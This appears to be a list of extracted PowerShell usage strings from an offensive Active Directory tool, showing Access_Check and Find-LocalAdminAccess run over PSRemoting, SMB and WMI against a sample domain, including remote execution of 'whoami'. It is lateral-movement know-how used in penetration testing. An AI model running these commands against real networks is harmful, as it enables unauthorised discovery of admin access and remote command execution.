"Write-Output ""    Access_Check -Method PSRemoting -Command `"
"Write-Output ""    Access_Check -Method PSRemoting -Domain ferrari.local -DomainController DC01.ferrari.local"
"Write-Output ""    Access_Check -Method PSRemoting -Targets `"
"Write-Output ""    Access_Check -Method PSRemoting"
"Write-Output ""    Access_Check -Method SMB -Domain ferrari.local -DomainController DC01.ferrari.local"
"Write-Output ""    Access_Check -Method SMB -Targets `"
"Write-Output ""    Access_Check -Method SMB"
"Write-Output ""    Do not run as local user (e.g.: nt authority\system) unless you specify credentials (WMI only)"
"Write-Output ""    Do not set $computerNameOnly as target if using WMI."
"Write-Output ""    Find-LocalAdminAccess -Method PSRemoting -Command 'whoami' -NoOutput"
"Write-Output ""    Find-LocalAdminAccess -Method PSRemoting -Command 'whoami'"
"Write-Output ""    Find-LocalAdminAccess -Method PSRemoting -Domain ferrari.local -DomainController DC01.ferrari.local"
"Write-Output ""    Find-LocalAdminAccess -Method PSRemoting -InLine"
"Write-Output ""    Find-LocalAdminAccess -Method PSRemoting -Targets `"
"Write-Output ""    Find-LocalAdminAccess -Method PSRemoting -UserName `"
"Write-Output ""    Find-LocalAdminAccess -Method PSRemoting"
"Write-Output ""    Find-LocalAdminAccess -Method SMB -Command 'whoami' -NoOutput"
"Write-Output ""    Find-LocalAdminAccess -Method SMB -Command 'whoami'"
"Write-Output ""    Find-LocalAdminAccess -Method SMB -Domain ferrari.local -DomainController DC01.ferrari.local"
"Write-Output ""    Find-LocalAdminAccess -Method SMB -InLine"
"Write-Output ""    Find-LocalAdminAccess -Method SMB -Targets `"
"Write-Output ""    Find-LocalAdminAccess -Method SMB"
"Write-Output ""    Find-LocalAdminAccess -Method WMI -Command 'whoami' -NoOutput"
"Write-Output ""    Find-LocalAdminAccess -Method WMI -Command 'whoami'"
"Write-Output ""    Find-LocalAdminAccess -Method WMI -Domain ferrari.local -DomainController DC01.ferrari.local"
"Write-Output ""    Find-LocalAdminAccess -Method WMI -InLine"
"Write-Output ""    Find-LocalAdminAccess -Method WMI -Targets `"
"Write-Output ""    Find-LocalAdminAccess -Method WMI -UserName `"
"Write-Output ""    Find-LocalAdminAccess -Method WMI"
